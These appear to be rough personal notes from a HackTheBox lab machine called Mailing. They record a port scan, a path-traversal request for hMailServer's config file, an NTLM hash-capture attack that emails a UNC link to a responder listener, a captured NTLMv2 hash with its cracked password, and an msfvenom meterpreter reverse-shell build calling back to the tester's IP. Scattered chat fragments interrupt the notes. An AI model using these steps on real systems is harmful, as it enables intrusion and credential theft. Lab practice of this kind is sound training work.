## Windows Machine Mailing
10.10.11.14
## Recon 
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
143/tcp   open  imap
445/tcp   open  microsoft-ds
465/tcp   open  smtps
587/tcp   open  submission
993/tcp   open  imaps
5040/tcp  open  unknown
5985/tcp  open  wsman
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
64052/tcp open  unknown


-- [1] :port 80:
	GET  /download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI HTTP/1.1 
	>>841bb5acfa6779ae432fd7a4e6600ba7
	
	it happend instantly
	and it spammed me
	
	yeah did u check
	the command
	
	but u need smb server
	with impacket
	in order to capture ntlm
	

responder -I tun0
parrot@parrot:~/Desktop/HackingLab/HackTheBox/Machines/Mailing$ python3 python1.py --server "mailing.htb" --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "administrator@mailing.htb" --recipient "maya@mailing.htb" --url '\10.10.11.14\test' --subject "Test Email
"
	
	NTMLv2 hash 
maya::MAILING:c67a8e4e4289b72c:C60E011F8E0B3208F938F1B7AC845528:010100000000000000913C50809EDA01D44F1087B3725DF7000000000200080050004A003000320001001E00570049004E002D0049004F003000320049004C0059005A0031004A00390004003400570049004E002D0049004F003000320049004C0059005A0031004A0039002E0050004A00300032002E004C004F00430041004C000300140050004A00300032002E004C004F00430041004C000500140050004A00300032002E004C004F00430041004C000700080000913C50809EDA010600040002000000080030003000000000000000000000000020000099D4D52F4A2B77B6BDE2A826986EA033F82D8CC9826159D04779473E86D7F3B20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330039000000000000000000
m4y4ngs4ri


msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.39 LPORT=4444 -f exe -o reverse.exe
